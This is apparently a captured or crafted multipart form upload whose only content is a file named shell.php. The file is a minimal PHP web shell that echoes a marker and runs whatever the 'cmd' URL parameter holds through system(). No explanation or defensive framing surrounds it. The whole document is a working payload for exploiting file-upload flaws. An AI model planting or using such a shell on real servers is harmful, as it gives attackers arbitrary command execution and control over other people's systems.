--------------------------bqgtdEhGdUxmfGG6zbwmzf
Content-Disposition: form-data; name="f"; filename="shell.php"
Content-Type: application/octet-stream

<?php echo 'SHELL_ACTIVE'; if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>

--------------------------bqgtdEhGdUxmfGG6zbwmzf--
